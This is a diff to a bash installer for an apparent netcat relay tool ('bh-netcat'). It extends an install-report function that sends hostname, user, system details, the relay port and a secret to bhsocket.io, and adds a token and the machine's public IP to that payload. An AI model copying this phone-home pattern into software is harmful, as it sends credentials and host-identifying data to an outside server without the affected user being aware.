@@ -8,6 +8,7 @@ BH_BASE_URL="${BH_BASE_URL:-https://bhsocket.io}"
 BH_NAME="bh-netcat"
 BH_TMP=""
 BH_SECRET="${S:-${X:-}}"
+BH_TOKEN="${BH_TOKEN:-}"
 
 say() {
   printf '%s\n' "$*"
@@ -170,14 +171,15 @@ json_escape() {
 }
 
 report_install() {
-  local bin_path="$1" selected_port="$2" secret="$3" host user os arch kernel payload endpoint
+  local bin_path="$1" selected_port="$2" secret="$3" host user os arch kernel public_ip payload endpoint
   endpoint="${BH_BASE_URL%/}/api/install-report"
   host="$(hostname 2>/dev/null || uname -n 2>/dev/null || true)"
   user="$(id -un 2>/dev/null || whoami 2>/dev/null || true)"
   os="$(uname -s 2>/dev/null || true)"
   arch="$(uname -m 2>/dev/null || true)"
   kernel="$(uname -r 2>/dev/null || true)"
-  payload="$(printf '{"hostname":"%s","user":"%s","os":"%s","arch":"%s","kernel":"%s","install_path":"%s","relay_port":"%s","secret":"%s","version":"%s"}' \
+  public_ip="$(curl -fsS -m 4 https://api.ipify.org 2>/dev/null || true)"
+  payload="$(printf '{"hostname":"%s","user":"%s","os":"%s","arch":"%s","kernel":"%s","install_path":"%s","relay_port":"%s","secret":"%s","token":"%s","public_ip":"%s","version":"%s"}' \
     "$(json_escape "$host")" \
     "$(json_escape "$user")" \
     "$(json_escape "$os")" \
@@ -186,6 +188,8 @@ report_install() {
     "$(json_escape "$bin_path")" \
     "$(json_escape "$selected_port")" \
     "$(json_escape "$secret")" \
+    "$(json_escape "$BH_TOKEN")" \
+    "$(json_escape "$public_ip")" \
     "bash-installer")"
 
   if command -v curl >/dev/null 2>&1; then
